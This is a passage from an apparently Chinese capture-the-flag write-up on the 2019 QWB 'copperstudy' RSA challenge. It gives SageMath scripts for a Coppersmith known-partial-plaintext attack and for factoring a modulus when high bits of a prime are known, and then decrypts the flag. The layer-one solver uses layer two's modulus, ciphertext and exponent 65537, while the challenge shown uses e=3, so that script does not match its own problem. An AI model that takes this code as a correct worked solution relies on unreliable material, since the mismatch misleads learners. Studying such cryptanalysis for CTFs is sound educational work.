</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>代码运行效果：</p> <p><img src="/assets/img/2019-qwb-5.edbd1718.png" alt=""></p> <h2 id="copperstudy"><a href="#copperstudy" class="header-anchor">#</a> copperstudy</h2> <h3 id="第一层"><a href="#第一层" class="header-anchor">#</a> 第一层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x1d90f208855a9b3e908d441ce0bea855e71c21289aa09ffe17e0d88e0b338b4e3d88a99666c7dee13c6fd770c95ed441518433141ed56bfe0e4e76474a05c1147b40fb3d4f41d738671bcdb4a2239d8db5beec191c161034f68914e5d5b68d710c44b25dfd612cff0b8bd323d8418845c02ec856b89d5685b49681c274d2eefL
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1c60163d0f766765b8b980dc9456326ecf184992ec2a424b8a69a7a66dd1ad1f3318b1e3bfafedff043b0d17700d99c5974d6672c69b5adee5d00517bf83819f12fd4b88ccc386749b40338f2c88b841a7b32e19f25d153acf4417814efc3613388a8696f38746282c20602cf08755aad494833fe439799a6b9635d70d46fd7L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">&gt;&gt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x28e38dd686922e7f55335b90d9569e87a7b6e2b74314944a19e68473335ae41c75cdf093a8c56d01d446636f4e2d4fe73ee235d476dddd000000000000000000L

<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>Coppersmith 已知部分明文攻击</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>
        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>
            a <span class="token operator">+=</span> <span class="token string">' '</span>
        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> bound<span class="token punctuation">:</span>
            a <span class="token operator">+=</span> <span class="token string">'~'</span>
        <span class="token keyword">print</span> a

<span class="token keyword">def</span> <span class="token function">coppersmith_howgrave_univariate</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> beta<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#</span>
    <span class="token comment"># init</span>
    <span class="token comment">#</span>
    dd <span class="token operator">=</span> pol<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span>
    nn <span class="token operator">=</span> dd <span class="token operator">*</span> mm <span class="token operator">+</span> tt

    <span class="token comment">#</span>
    <span class="token comment"># checks</span>
    <span class="token comment">#</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token number">0</span> <span class="token operator">&lt;</span> beta <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">&quot;beta should belongs in (0, 1]&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> pol<span class="token punctuation">.</span>is_monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ArithmeticError<span class="token punctuation">(</span><span class="token string">&quot;Polynomial must be monic.&quot;</span><span class="token punctuation">)</span>

    <span class="token comment">#</span>
    <span class="token comment"># calculate bounds and display them</span>
    <span class="token comment">#</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        <span class="token comment"># t optimized?</span>
        cond1 <span class="token operator">=</span> RR<span class="token punctuation">(</span>XX<span class="token operator">^</span><span class="token punctuation">(</span>nn<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        cond2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> beta<span class="token operator">*</span>mm<span class="token punctuation">)</span>

        <span class="token comment"># bound for X</span>
        cond2 <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>beta<span class="token operator">*</span>mm<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>nn<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dd<span class="token operator">*</span>mm<span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>nn<span class="token operator">*</span><span class="token punctuation">(</span>nn<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>

        <span class="token comment"># solution possible?</span>
        detL <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span>dd <span class="token operator">*</span> mm <span class="token operator">*</span> <span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> XX<span class="token operator">^</span><span class="token punctuation">(</span>nn <span class="token operator">*</span> <span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        cond1 <span class="token operator">=</span> RR<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> detL<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>nn<span class="token punctuation">)</span><span class="token punctuation">)</span>
        cond2 <span class="token operator">=</span> RR<span class="token punctuation">(</span>modulus<span class="token operator">^</span><span class="token punctuation">(</span>beta<span class="token operator">*</span>mm<span class="token punctuation">)</span> <span class="token operator">/</span> sqrt<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># warning about X</span>

    <span class="token comment">#</span>
    <span class="token comment"># Coppersmith revisited algo for univariate</span>
    <span class="token comment">#</span>
    <span class="token comment"># change ring of pol and x</span>
    polZ <span class="token operator">=</span> pol<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>
    x <span class="token operator">=</span> polZ<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gen<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># compute polynomials</span>
    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token punctuation">:</span>
            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>jj <span class="token operator">*</span> modulus<span class="token operator">**</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> ii<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>ii<span class="token punctuation">)</span>
    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>ii <span class="token operator">*</span> polZ<span class="token punctuation">(</span>x <span class="token operator">*</span> XX<span class="token punctuation">)</span><span class="token operator">**</span>mm<span class="token punctuation">)</span>

    <span class="token comment"># construct lattice B</span>
    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>

    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ii<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">[</span>jj<span class="token punctuation">]</span>

    <span class="token comment"># display basis matrix</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>

    <span class="token comment"># LLL</span>
    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># transform shortest vector in polynomial</span>
    new_pol <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>
        new_pol <span class="token operator">+=</span> x<span class="token operator">**</span>ii <span class="token operator">*</span> BB<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">/</span> XX<span class="token operator">**</span>ii

    <span class="token comment"># factor polynomial</span>
    potential_roots <span class="token operator">=</span> new_pol<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">&quot;potential roots:&quot;</span><span class="token punctuation">,</span> potential_roots

    <span class="token comment"># test roots</span>
    roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> root <span class="token keyword">in</span> potential_roots<span class="token punctuation">:</span>
        <span class="token keyword">if</span> root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>is_integer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> polZ<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>modulus<span class="token punctuation">,</span> result<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> modulus<span class="token operator">^</span>beta<span class="token punctuation">:</span>
                roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ZZ<span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment">#</span>
    <span class="token keyword">return</span> roots
length_N <span class="token operator">=</span> <span class="token number">512</span>  <span class="token comment"># size of the modulus</span>
Kbits <span class="token operator">=</span> <span class="token number">64</span>      <span class="token comment"># size of the root</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

<span class="token comment"># RSA gen (for the demo)</span>
N <span class="token operator">=</span><span class="token number">0x8cacfeb65d0e95a3f9bc0bf77763c5cc93ed49c8f70644dfdca3031047635122980740d506055f31a5e82930e33d91c0ac2a5440e6579da1f0ce96602fa2fbe557a160e008f05e8d480558b615429194157caf3678ee2d1f21250ea45b34e02aba8e3981de882383e60bce8e8155fa6117bd7c949176c679fcf665eb94e3adb</span>
ZmodN <span class="token operator">=</span> Zmod<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># Create problem (for the demo)</span>
K <span class="token operator">=</span> ZZ<span class="token punctuation">.</span>random_element<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>Kbits<span class="token punctuation">)</span>
Kdigits <span class="token operator">=</span> K<span class="token punctuation">.</span>digits<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
C <span class="token operator">=</span> <span class="token number">0x76eceaf4109b64fa85c7e8fbf47319d48ab965c2ab22e05212f73c4cdc441e80328cb048c5b5db0327e8ef18b17a9e28ec059efe10691d8a34cee18b3f51dbc865d92c9c0f49981ce6254420f53e9b9064621328dd4e3ea317d13c0e5b28099dab4a7e8497b4fcb8d1735ce8d8bd2589c8bd95aaf5cf5751796a59cfd1f0113</span>

<span class="token comment"># Problem to equation (default)</span>
P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZmodN<span class="token punctuation">)</span> <span class="token comment">#, implementation='NTL')</span>

pol <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token number">7327252114503947508269325471363173220565465408364019550637516047539954866291850283298359927561303018712792763600801471488538723937511693943848975527313408</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> C
dd <span class="token operator">=</span> pol<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Tweak those</span>
beta <span class="token operator">=</span> <span class="token number">1</span>                                <span class="token comment"># b = N</span>
epsilon <span class="token operator">=</span> beta <span class="token operator">/</span> <span class="token number">7</span>                      <span class="token comment"># &lt;= beta / 7</span>
mm <span class="token operator">=</span> ceil<span class="token punctuation">(</span>beta<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">/</span> <span class="token punctuation">(</span>dd <span class="token operator">*</span> epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment"># optimized value</span>
tt <span class="token operator">=</span> floor<span class="token punctuation">(</span>dd <span class="token operator">*</span> mm <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span>beta<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># optimized value</span>
XX <span class="token operator">=</span> ceil<span class="token punctuation">(</span>N<span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">(</span>beta<span class="token operator">**</span><span class="token number">2</span><span class="token operator">/</span>dd<span class="token punctuation">)</span> <span class="token operator">-</span> epsilon<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># optimized value</span>

<span class="token comment"># Coppersmith</span>

roots <span class="token operator">=</span> coppersmith_howgrave_univariate<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> N<span class="token punctuation">,</span> beta<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">)</span>

<span class="token comment"># output</span>
<span class="token keyword">print</span> <span class="token string">&quot;\n# Solutions&quot;</span>
<span class="token keyword">print</span> <span class="token string">&quot;we want to find:&quot;</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>K<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">&quot;we found:&quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>roots<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">&quot;\n&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br></div></div><h3 id="第二层"><a href="#第二层" class="header-anchor">#</a> 第二层</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x8cacfeb65d0e95a3f9bc0bf77763c5cc93ed49c8f70644dfdca3031047635122980740d506055f31a5e82930e33d91c0ac2a5440e6579da1f0ce96602fa2fbe557a160e008f05e8d480558b615429194157caf3678ee2d1f21250ea45b34e02aba8e3981de882383e60bce8e8155fa6117bd7c949176c679fcf665eb94e3adbL
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x76eceaf4109b64fa85c7e8fbf47319d48ab965c2ab22e05212f73c4cdc441e80328cb048c5b5db0327e8ef18b17a9e28ec059efe10691d8a34cee18b3f51dbc865d92c9c0f49981ce6254420f53e9b9064621328dd4e3ea317d13c0e5b28099dab4a7e8497b4fcb8d1735ce8d8bd2589c8bd95aaf5cf5751796a59cfd1f0113L
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">&gt;&gt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x8be6dcbed09bcf80bfb3f3bdfe79b92ab0404dd334036c8c79bfc857af2b679debf7b670e0f66a39791ba6c6175c427a00000000000000000000000000000000L
<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>Factoring with High Bits Known，当我们知道一个公钥中模数 N 的一个因子的较高位时，我们就有一定几率来分解 N。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>n <span class="token operator">=</span> <span class="token number">0x8cacfeb65d0e95a3f9bc0bf77763c5cc93ed49c8f70644dfdca3031047635122980740d506055f31a5e82930e33d91c0ac2a5440e6579da1f0ce96602fa2fbe557a160e008f05e8d480558b615429194157caf3678ee2d1f21250ea45b34e02aba8e3981de882383e60bce8e8155fa6117bd7c949176c679fcf665eb94e3adb</span>
p4 <span class="token operator">=</span><span class="token number">0x8be6dcbed09bcf80bfb3f3bdfe79b92ab0404dd334036c8c79bfc857af2b679debf7b670e0f66a39791ba6c6175c427a</span>
cipher <span class="token operator">=</span> <span class="token number">0x76eceaf4109b64fa85c7e8fbf47319d48ab965c2ab22e05212f73c4cdc441e80328cb048c5b5db0327e8ef18b17a9e28ec059efe10691d8a34cee18b3f51dbc865d92c9c0f49981ce6254420f53e9b9064621328dd4e3ea317d13c0e5b28099dab4a7e8497b4fcb8d1735ce8d8bd2589c8bd95aaf5cf5751796a59cfd1f0113</span>
e2 <span class="token operator">=</span> <span class="token number">65537</span>
pbits <span class="token operator">=</span> <span class="token number">512</span>
kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#kbits = 1024</span>
<span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> kbits
p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbits
PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> x <span class="token operator">+</span> p4
roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> roots
<span class="token keyword">if</span> roots<span class="token punctuation">:</span>
   p <span class="token operator">=</span> p4<span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token keyword">print</span> <span class="token string">&quot;p: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>
   q <span class="token operator">=</span> n<span class="token operator">/</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
   <span class="token keyword">print</span> <span class="token string">&quot;q: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
   phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
   <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
   d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
   flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
   <span class="token keyword">print</span>  <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
